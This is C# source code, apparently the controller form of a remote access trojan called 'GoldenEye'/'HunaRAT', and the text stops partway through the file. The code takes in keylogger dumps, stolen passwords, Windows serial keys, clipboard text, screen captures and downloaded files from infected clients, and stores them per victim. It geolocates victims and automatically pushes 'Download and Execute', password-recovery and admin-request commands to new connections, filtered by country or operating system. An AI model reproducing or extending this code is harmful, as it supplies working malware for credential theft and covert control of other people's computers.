using GoldenEye_Remote_Administration_Tool.Forms;
using GoldenEye_Remote_Administration_Tool.Functions;
using HunaRAT.Forms;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace GoldenEye_Remote_Administration_Tool
{
    public partial class Form1 : Form
    {
        /*
         *
         *
         *
         *
         *  AUCH IN LICENSE FORM ÄNDERN DIE RAT VERSION
         */

        public string RatVersion = "1.1.6";
        /*
        *
        *
        *
        *
        *
        *
        */
        private int port;
        private int online = 0;
        private Thread listenerThread;
        private TcpListener listener;
        public bool isFileSearcherOn = false;
        public License licns;
        public bool authed = false;

        public Thread dooit(Connection client, string cmd)
        {
            var t = new Thread(() => ddooooiitt(client, cmd));
            t.Start();
            return t;
        }

        public static string GetRandomString()
        {
            string path = Path.GetRandomFileName();
            path = path.Replace(".", ""); // Remove period.
            return path;
        }

        private void ddooooiitt(Connection client, string cmd)
        {
            Form2 fm = new Form2();
            fm.cmd = cmd;
            fm.client = client;
            fm.Name = ("|asasas|" + GetRandomString());
            fm.Text = ("CND . " + GetRandomString());
            fm.Show();
        }

        public void doCommandAsync(Connection client, string cmd)
        {
            dooit(client, cmd);
        }

        public Form1(License lic)
        {
            InitializeComponent();
            licns = lic;
            Thread authedcheck = new Thread(checkauthed);
            authedcheck.IsBackground = true;
            authedcheck.Start();
        }

        private void checkauthed()
        {
            repeat:
            if (authed == false)
            {
                MessageBox.Show("Failed to authentificate. Please Restart the Application!");
                Environment.Exit(0);
            }
            Thread.Sleep(4000);
            goto repeat;
        }

        private void Listen()
        {
            listener.Start();
            while (true)
            {
                Connection clientConnection = new Connection(listener.AcceptTcpClient());
                clientConnection.DisconnectedEvent += new Connection.Disconnected(clientConnection_DisconnectedEvent);
                clientConnection.ReceivedEvent += new Connection.Received(clientConnection_ReceivedEvent);
            }
        }

        private void clientConnection_ReceivedEvent(Connection client, String Message)
        {
            string[] cut = Message.Split('|');
            switch (cut[0])
            {
                case "CONNECTED":
                    Invoke(new _AddClient(AddClient), client, cut[1], cut[2], cut[3], cut[4], cut[5], cut[6], cut[7], cut[8]);
                    break;

                case "STATUS":
                    Invoke(new _Status(Status), client, cut[1]);
                    break;

                case "RDESKIMG":
                    Invoke(new _setRdesktopImg(setRdesktopImg), client, cut[1]);
                    break;
                case "REMSIZE":
                    Invoke(new _remsize(remsize), client, cut[1], cut[2]);
                    break;
                case "ACTWINDOW":
                    Invoke(new _updateActiveWindow(updateActiveWindow), client, cut[1]);
                    break;

                case "SADVINFO":
                    Invoke(new _setAdvInfo(setAdvInfo), client, cut[1], cut[2], cut[3], cut[4], cut[5], cut[6], cut[7], cut[8], cut[9], cut[10], cut[11], cut[12], cut[13], cut[14]);
                    break;

                case "ADDPROC":
                    Invoke(new _addProcToList(addProcToList), client, cut[1]);
                    break;

                case "CMDOUTPUT":
                    Invoke(new _cmdOutput(cmdOutput), client, cut[1]);
                    break;
                // File Manager
                case "fmXlistDrives":
                    Invoke(new _fmlistDrives(fmlistDrives), client, cut[1]);
                    break;

                case "fmXdlfile":
                    Invoke(new _fmdlfile(fmdlfile), client, cut[1], cut[2], cut[3], cut[4]);
                    break;
                // Recovery
                case "winserial":
                    Invoke(new _recoveryWinSerial(recoveryWinSerial), client, cut[1], cut[2], cut[3]);
                    break;

                case "passreco":
                    Invoke(new _recoveryPass(recoveryPass), client, cut[1], cut[2]);
                    break;

                case "chatMSG":
                    Invoke(new _addChatMsg(addChatMsg), client, cut[1], cut[2]);
                    break;

                case "chatleft":
                    Invoke(new _chatLeft(chatLeft), client, cut[1]);
                    break;

                case "GINFO":
                    Invoke(new _ginfo(ginfo), client, cut[1], cut[2]);
                    break;

                case "Wlist":
                    Invoke(new _addWindowToList(addWindowToList), client, cut[1]);
                    break;

                case "ADDLOG":
                    Invoke(new _addLog(addlog), client, cut[1], cut[2], cut[3]);
                    break;

                case "fmgerXcptext":
                    Invoke(new _clipboardText(clipboardText), client, cut[1]);
                    break;

                case "hostsXsetxt":
                    Invoke(new _hoststext(hoststext), client, cut[1]);
                    break;
                case "KLOGS":
                    Invoke(new _klogs(klogs), client, cut[1]);
                    break;

            }
        }

        #region <Invoking>
        private delegate void _klogs(Connection client, string dump);

        private void klogs(Connection client, string dump)
        {
            try
            {
                Keylogger fm = Application.OpenForms["|keylogg|" + client.UniqueID] as Keylogger;
                fm.addlogs(dump);
            }
            catch
            {
            }
        }

        private delegate void _remsize(Connection client, string x, string y);

        private void remsize(Connection client, string x, string y)
        {
            RemoteDesktop fm = Application.OpenForms["|desktp|" + client.UniqueID] as RemoteDesktop;

            try
            {
                fm.Sz = new Size(int.Parse(x), int.Parse(y));
            }
            catch
            {
            }
        }
        private delegate void _hoststext(Connection client, string text);

        private void hoststext(Connection client, string text)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                fm.richTextBox3.Text = text.Replace("[newline]", Environment.NewLine);
            }
            catch
            {
            }
        }

        private delegate void _clipboardText(Connection client, string text);

        private void clipboardText(Connection client, string text)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                fm.richTextBox1.Text = text.Replace("[newline]", Environment.NewLine);
            }
            catch
            {
            }
        }

        private delegate void _addLog(Connection client, string clientid, string type, string message);

        private void addlog(Connection client, string clientid, string type, string message)
        {
            ListViewItem item = new ListViewItem();
            item.Text = clientid;
            item.SubItems.Add(type);
            item.SubItems.Add(message);
            item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));

            if (type.Equals("Info"))
            {
                item.ImageIndex = 0;
            }
            else if (type.Equals("Error"))
            {
                item.ImageIndex = 1;
            }
            else if (type.Equals("Warning"))
            {
                item.ImageIndex = 2;
            }
            else if (type.Equals("Risk"))
            {
                item.ImageIndex = 3;
            }
            else if (type.Equals("Priority"))
            {
                item.ImageIndex = 4;
            }
            else if (type.Equals("Log"))
            {
                item.ImageIndex = 5;
            }

            listView8.Items.Add(item);

            if (writeAllLogTypesToFileS.Equals("true"))
            {
                File.AppendAllText(Application.StartupPath + @"\Logs.txt", "[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] " + type + ": " + message + Environment.NewLine);
            }
        }

        private delegate void _addWindowToList(Connection client, string allWindowsString);

        private void addWindowToList(Connection client, string allWindowsString)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                string[] windows = allWindowsString.Split('³');

                foreach (string window in windows)
                {
                    //string procName = proc.Split('²')[0];
                    //string procID = proc.Split('²')[1];
                    //string procTitle = proc.Split('²')[2];

                    ListViewItem item = new ListViewItem();
                    item.Text = window.Split('²')[0];
                    item.ImageKey = "Adjustment_16px.png";
                    item.SubItems.Add(window.Split('²')[1]);
                    item.SubItems.Add(window.Split('²')[2]);
                    fm.listView3.Items.Add(item);
                }
            }
            catch
            {
            }
        }

        private delegate void _ginfo(Connection client, String clientid, String value);

        private void ginfo(Connection client, String clientid, String value)
        {
            ListViewItem item = new ListViewItem();
            item.Text = clientid;
            if (value.Equals(""))
            {
                value = "None / Unknown";
            }
            item.SubItems.Add(value);
            item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
            listView4.Items.Add(item);
        }

        private delegate void _chatLeft(Connection client, String name);

        private void chatLeft(Connection client, String name)
        {
            RemoteChat fm = Application.OpenForms["|rmchat|" + client.UniqueID] as RemoteChat;
            fm.closedByMachine();
        }

        private delegate void _addChatMsg(Connection client, String name, String message);

        private void addChatMsg(Connection client, String name, String message)
        {
            RemoteChat fm = Application.OpenForms["|rmchat|" + client.UniqueID] as RemoteChat;
            fm.addmsg(name, message);
        }

        // Recovery

        private delegate void _recoveryPass(Connection client, string ClientID, string passString);

        private void recoveryPass(Connection client, string ClientID, string passString)
        {
            try
            {
                // listView5 > Client ID | Type | File / Website | Email / Username | Password | Date
                string[] passesall = passString.Split('³');
                string final = string.Empty;
                foreach (string pas in passesall)
                {
                    ListViewItem item = new ListViewItem();
                    item.Text = ClientID;
                    item.SubItems.Add(pas.Split('²')[0]);
                    item.SubItems.Add(pas.Split('²')[1]);
                    item.SubItems.Add(pas.Split('²')[2]);
                    item.SubItems.Add(pas.Split('²')[3]);
                    item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
                    item.ImageKey = "ShowPassword_16px.png";
                    foreach (ListViewItem ix in listView5.Items)
                    {
                        if (pas.Split('²')[0] == ix.SubItems[1].Text)
                        {
                            if (pas.Split('²')[1] == ix.SubItems[2].Text)
                            {
                                if (pas.Split('²')[2] == ix.SubItems[3].Text)
                                {
                                    if (pas.Split('²')[3] == ix.SubItems[4].Text)
                                    {
                                        return;
                                    }
                                }
                            }
                        }
                    }
                    listView5.Items.Add(item);

                    final += "--------------------------" + Environment.NewLine;
                    final += "Client: " + ClientID + Environment.NewLine;
                    final += "Type: " + pas.Split('²')[0] + Environment.NewLine;
                    final += "Website: " + pas.Split('²')[1] + Environment.NewLine;
                    final += "Username: " + pas.Split('²')[2] + Environment.NewLine;
                    final += "Password: " + pas.Split('²')[3] + Environment.NewLine;
                    final += "Date: " + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + Environment.NewLine;

                    if (velyseCheckbox6.Checked == true)
                    {
                        if (!File.ReadAllText(t_TextBox1.Text).Contains(final))
                        {
                            File.AppendAllText(t_TextBox1.Text, final);
                        }
                    }
                    try
                    {
                        File.WriteAllText(@"Client Data\" + ClientID + @"\Recovered Data\Recovered Passwords.txt", final);
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }
        }

        private delegate void _recoveryWinSerial(Connection client, string ClientID, string OSver, string serialkey);

        private void recoveryWinSerial(Connection client, string ClientID, string OSver, string serialkey)
        {
            try
            {
                // listView5 > Client ID | Type | File / Website | Email / Username | Password | Date
                ListViewItem item = new ListViewItem();
                item.Text = ClientID;
                item.SubItems.Add("Windows Serial Key");
                item.SubItems.Add(OSver);
                item.SubItems.Add("---");
                item.SubItems.Add(serialkey);
                item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
                item.ImageKey = "Key2_16px.png";
                foreach (ListViewItem ix in listView5.Items)
                {
                    if ("Windows Serial Key" == ix.SubItems[1].Text)
                    {
                        if (OSver == ix.SubItems[2].Text)
                        {
                            if ("---" == ix.SubItems[3].Text)
                            {
                                if (serialkey == ix.SubItems[4].Text)
                                {
                                    return;
                                }
                            }
                        }
                    }
                }
                listView5.Items.Add(item);
                string final = string.Empty;
                final += "--------------------------" + Environment.NewLine;
                final += "Client: " + ClientID + Environment.NewLine;
                final += "Type: " + "Windows Serial Key" + Environment.NewLine;
                final += "Operating System: " + OSver + Environment.NewLine;
                final += "Serial Key: " + serialkey + Environment.NewLine;
                final += "Date: " + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + Environment.NewLine;
                if (velyseCheckbox6.Checked == true)
                {
                    if (!File.ReadAllText(t_TextBox1.Text).Contains(final))
                    {
                        File.AppendAllText(t_TextBox1.Text, final);
                    }
                }
                try
                {
                    File.WriteAllText(@"Client Data\" + ClientID + @"\Recovered Data\Windows Serial Key.txt", final);
                }
                catch
                {
                }
            }
            catch
            {
            }
        
        }

        // File Manager

        private delegate void _fmdlfile(Connection client, string output, string filename, string clientID, string type);

        private void fmdlfile(Connection client, string output, string filename, string clientID, string type)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                File.WriteAllBytes(Application.StartupPath + @"\Client Data\" + clientID + @"\Downloaded Files\" + filename, Convert.FromBase64String(output));
                if (type == "File Searcher")
                {
                    ListViewItem item = new ListViewItem();
                    item.Text = clientID;
                    item.SubItems.Add("File Searcher");
                    item.SubItems.Add(filename);
                    item.SubItems.Add(output.Length.ToString());
                    item.SubItems.Add(Application.StartupPath + @"\Client Data\" + clientID + @"\Downloaded Files\" + filename);
                    item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
                    item.ForeColor = Color.LightGreen;
                    listView3.Items.Add(item);
                }
                foreach (ListViewItem item2 in listView3.Items)
                {
                    if (type == "Task Manager")
                    {
                        if (item2.Text == clientID)
                        {
                            if (item2.SubItems[1].Text.Equals(type))
                            {
                                item2.ForeColor = Color.LightGreen;
                            }
                        }
                    }
                    if (item2.Text == clientID)
                    {
                        if (item2.SubItems[1].Text.Equals(type))
                        {
                            if (item2.SubItems[2].Text.Equals(filename))
                            {
                                if (item2.SubItems[4].Text.Equals(Application.StartupPath + @"\Client Data\" + clientID + @"\Downloaded Files\" + filename))
                                {
                                    item2.ForeColor = Color.LightGreen;
                                }
                            }
                        }
                    }

                    if (item2.ForeColor.Equals(Color.Orange))
                    {
                        if (item2.Text.Equals(clientID))
                        {
                            item2.ForeColor = Color.Red;
                            item2.SubItems[1].Text = "FAILED";
                        }
                    }
                }
            }
            catch
            {
            }
         
        }

        private delegate void _fmlistDrives(Connection client, string output);

        private void fmlistDrives(Connection client, string output)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                ListViewItem item = new ListViewItem();
                item.Text = "...";
                item.SubItems.Add("---");
                item.SubItems.Add("---");
                item.SubItems.Add("---");
                item.ImageKey = "ThickArrowPointingUp_16px.png";
                fm.listView2.Items.Add(item);

                string[] drives = output.Split('³');
                foreach (string drive in drives)
                {
                    //string procName = proc.Split('²')[0];
                    //string procID = proc.Split('²')[1];
                    //string procTitle = proc.Split('²')[2];

                    ListViewItem item2 = new ListViewItem();
                    if (drive.Split('²')[0].Equals(string.Empty))
                    {
                        if (fm.listView2.Items.Count == 1 && fm.txtLocation.Text == "" || fm.listView2.Items.Count == 1 && fm.txtLocation.Text == @"C:\")
                        {
                            item2.Text = @"C:\";
                            item2.ImageKey = "SSD_16px.png";
                            item2.SubItems.Add("Drive");
                            item2.SubItems.Add("Error (VM??)");
                            item2.SubItems.Add("Unknown");
                            fm.listView2.Items.Add(item2);

                            return;
                        }
                    }
                    else
                    {
                        item2.Text = drive.Split('²')[0];
                    }
                    if (drive.Split('²')[1].Equals("Folder"))
                    {
                        item2.ImageKey = "Folder_16px.png";
                    }
                    else if (drive.Split('²')[1].Equals("File"))
                    {
                        item2.ImageKey = "File_16px.png";
                    }
                    else if (drive.Split('²')[1].StartsWith("Drive"))
                    {
                        item2.ImageKey = "SSD_16px.png";
                    }
                    else if (drive.Split('²')[1].StartsWith("CDRom"))
                    {
                        item2.ImageKey = "CD_16px.png";
                    }
                    item2.SubItems.Add(drive.Split('²')[1]);
                    item2.SubItems.Add(drive.Split('²')[2]);
                    item2.SubItems.Add(drive.Split('²')[3]);
                    fm.listView2.Items.Add(item2);
                }
            }
            catch
            {
            }
        }

        // File Manager *END*
        private delegate void _cmdOutput(Connection client, string output);

        private void cmdOutput(Connection client, string output)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                fm.addToCMD(output);
            }
            catch
            {
            }
        }

        private delegate void _addProcToList(Connection client, string allProcsString);

        private void addProcToList(Connection client, string allProcsString)
        {
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;

            try
            {
                string[] procs = allProcsString.Split('³');

                foreach (string proc in procs)
                {
                    //string procName = proc.Split('²')[0];
                    //string procID = proc.Split('²')[1];
                    //string procTitle = proc.Split('²')[2];

                    ListViewItem item = new ListViewItem();
                    item.Text = proc.Split('²')[0];
                    item.ImageKey = "Outline_16px.png";
                    item.SubItems.Add(proc.Split('²')[1]);
                    item.SubItems.Add(proc.Split('²')[2]);
                    fm.listView1.Items.Add(item);
                }
            }
            catch
            {
            }
        }

        private delegate void _setAdvInfo(Connection client, string clientID, string clientPath, string privs, string OperatingSystem, string activeWindow, string antivirus, string systemUptime, string MachineName, string UserName, string machineType, string CPU, string GPU, string InstalledRAM, string MonitorCount);

        private void setAdvInfo(Connection client, string clientID, string clientPath, string privs, string OperatingSystem, string activeWindow, string antivirus, string systemUptime, string MachineName, string UserName, string machineType, string CPU, string GPU, string InstalledRAM, string MonitorCount)
        {
            try
            {            
            ClientManager fm = Application.OpenForms["|rclientn|" + client.UniqueID] as ClientManager;
            fm.clientID = clientID;
            foreach (ListViewItem item in listView1.Items)
            {
                if ((Connection)item.Tag == client)
                {
                    fm.country = item.SubItems[2].Text;
                }
            }
            fm.clientPath = clientPath;
            fm.privs = privs;
            fm.OperatingSystem = OperatingSystem;
            fm.activeWindow = activeWindow;
            if (antivirus.Equals(""))
            {
                antivirus = "None";
            }
            fm.antivirus = antivirus;
            fm.systemUptime = systemUptime;
            fm.MachineName = MachineName;
            fm.UserName = UserName;
            fm.machineType = machineType;
            fm.CPU = CPU;
            fm.GPU = GPU;
            fm.InstalledRAM = InstalledRAM;
            fm.MonitorCount = MonitorCount;
            fm.setClientInfo();
            }
            catch { }
        }

        private delegate void _setRdesktopImg(Connection client, String imgBytes);

        private void setRdesktopImg(Connection client, String imgBytes)
        {
            try
            {
                RemoteDesktop fm = Application.OpenForms["|desktp|" + client.UniqueID] as RemoteDesktop;
                ((PictureBox)fm.Controls["pictureBox1"]).Image = ImageFromBase64String(imgBytes);
            }
            catch { }
        }

        private delegate void _AddClient(Connection client, String clientid, string activewindow, string os, string machinename, string machinetype, string privileges, string stubver, string pingms);

        private GeoIP geox = new GeoIP();

        private void AddClient(Connection client, String clientid, string activewindow, string os, string machinename, string machinetype, string privileges, string stubver, string pingms)
        {
            // Client ID | Latency | Location | Active Window | IP Address | Operating System | Machine Name | Machine Type | Privileges | Status | Stub Version
            string country = geox.LookupCountryName(client.IPAddress);
            string countryCode = geox.LookupCountryCode(client.IPAddress);

            if (connectionlimitS.Equals("true"))
            {
                if (listView1.Items.Count > connectionlimitNmbr)
                {
                    client.Send("DISCONNECT");
                }
            }
            foreach (ListViewItem it in listView1.Items)
            {
                if (it.Text.Equals(clientid))
                {
                    if (it.SubItems[2].Equals(country))
                    {
                        if (it.SubItems[4].Equals(client.IPAddress))
                        {
                            if (it.SubItems[5].Equals(os))
                            {
                                if (it.SubItems[6].Equals(machinename))
                                {
                                    if (it.SubItems[7].Equals(machinetype))
                                    {
                                        client.Send("DISCONNECT");
                                    }
                                }
                            }
                        }
                    }
                    
                }
            }

            ListViewItem item = new ListViewItem();
            item.Text = clientid;
            item.ImageKey = countryCode + ".png";
            item.SubItems.Add(pingms);
            item.SubItems.Add(country);
            item.SubItems.Add(activewindow);
            item.SubItems.Add(client.IPAddress);
            item.SubItems.Add(os);
            item.SubItems.Add(machinename);
            item.SubItems.Add(machinetype);
            item.SubItems.Add(privileges);
            item.SubItems.Add("Just connected"); // Status
            item.SubItems.Add(stubver);
            item.Tag = client;
            online++;
            listView1.Items.Add(item);
            updateOnline();
            if (createFolderEachClientS.Equals("true") || createFolderEachClientS.Equals("false") || createFolderEachClientS.Equals(""))
            {
                if (!Directory.Exists(@"Client Data\" + clientid))
                {
                    Directory.CreateDirectory(@"Client Data\" + clientid);
                    Directory.CreateDirectory(@"Client Data\" + clientid + @"\Downloaded Files");
                    Directory.CreateDirectory(@"Client Data\" + clientid + @"\Recovered Data");
                }
                string infoToWrite = String.Empty;
                DateTime dt = DateTime.Now;

                infoToWrite += "{*~*}----------------{ Auto Generated Client Information File }----------------{*~*}" + "\n";
                infoToWrite += "\n";
                infoToWrite += "{->} Client ID: " + clientid + "\n";
                infoToWrite += "{->} Temporary UCI Number: " + client.UniqueID + "\n";
                infoToWrite += "{->} Last Ping: " + pingms + "\n";
                infoToWrite += "{->} Country: " + country + "[" + countryCode + "]" + "\n";
                infoToWrite += "{->} Last Active Window: " + activewindow + "\n";
                infoToWrite += "{->} Last IP Address: " + client.IPAddress + "\n";
                infoToWrite += "{->} Operating System: " + os + "\n";
                infoToWrite += "{->} Machine Name: " + machinename + "\n";
                infoToWrite += "{->} Machine Type: " + machinetype + "\n";
                infoToWrite += "{->} Latest Privileges: " + privileges + "\n";
                infoToWrite += "{->} Latest Status: " + "Just connected" + "\n";
                infoToWrite += "{->} Stub Version: " + stubver + "\n";
                infoToWrite += "\n";
                infoToWrite += "*This File has been created on " + dt.ToString("dd.MM.yyyy HH:mm:ss") + "\n";
                infoToWrite += "{*~*}--------------------------------------------------------------------------{*~*}";
                File.WriteAllText(@"Client Data\" + clientid + @"\Client Info.txt", infoToWrite);
            }
            if (notificationClientConnectS.Equals("true"))
            {
            }
            if (playsoundClientConnectS.Equals("true"))
            {
                System.IO.Stream str = Properties.Resources.ConnectedSound;
                System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
                snd.Play();
            }

            /* On Join Commands System */
            OnJoinCommandsHandler onjoinhandler = new OnJoinCommandsHandler();
            onjoinhandler.clientus = client;

            if (listView9.Items.Count > 0)
            {
                foreach (ListViewItem ia in listView9.Items)
                {
                    
                        string Clients = ia.Text;
                        string ExecuteBy = Clients.Split('~')[0];
                        string ExecuteByArguments = Clients.Split('~')[1];
                        string Command = ia.SubItems[1].Text;
                        string InputData = ia.SubItems[2].Text;
                        int maxExecutes = 0;
                        if (ia.SubItems[3].Text.Equals("Unlimited"))
                        {
                        maxExecutes = 9999999;
                        } else
                        {
                        int.Parse(ia.SubItems[3].Text);
                        }
                    
                    int totalExecutes = int.Parse(ia.SubItems[4].Text);
                    
      

                    if (ExecuteBy.Equals("All Clients"))
                    {
                        if (Command.Equals("Download and Execute"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("execute²file²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Update Client Executable"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("execute²update²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Recover Passwords"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("Recover²Passwords");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Recover Win-SerialKey"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("Recover²Winserial");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Request Admin Privileges"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("uac²request");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Run Malware Cleaner"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("antim²normal");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Enable Proactive Scanner"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("antim²enableprs");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Disable Proactive Scanner"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("antim²disableprs");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Disconnect Client"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("action²disconnect");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                        else if (Command.Equals("Uninstall Client"))
                        {
                            if (totalExecutes < maxExecutes)
                            {
                                onjoinhandler.addToSend("action²uninstall");
                                totalExecutes = totalExecutes + 1;
                                ia.SubItems[4].Text = totalExecutes.ToString();
                            }
                            else
                            {
                            }
                        }
                    }
                    else if (ExecuteBy.Equals("Country"))
                    {
                        if (country.Contains(ExecuteByArguments))
                        {
                            if (Command.Equals("Download and Execute"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²file²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Update Client Executable"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²update²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Passwords"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Passwords");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Win-SerialKey"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Winserial");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Request Admin Privileges"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("uac²request");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Run Malware Cleaner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²normal");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Enable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²enableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²disableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Disconnect Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²disconnect");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Uninstall Client"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("action²uninstall");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                        }
                    }
                    else if (ExecuteBy.Equals("OS"))
                    {
                        if (os.Contains(ExecuteByArguments))
                        {
                            if (Command.Equals("Download and Execute"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²file²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Update Client Executable"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("execute²update²" + InputData.Split('§')[0] + "²" + InputData.Split('§')[1]);
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Passwords"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Passwords");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Recover Win-SerialKey"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("Recover²Winserial");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Request Admin Privileges"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("uac²request");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Run Malware Cleaner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²normal");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
                            }
                            else if (Command.Equals("Enable Proactive Scanner"))
                            {
                                if (totalExecutes < maxExecutes)
                                {
                                    onjoinhandler.addToSend("antim²enableprs");
                                    totalExecutes = totalExecutes + 1;
                                    ia.SubItems[4].Text = totalExecutes.ToString();
                                }
                                else
                                {
                                }
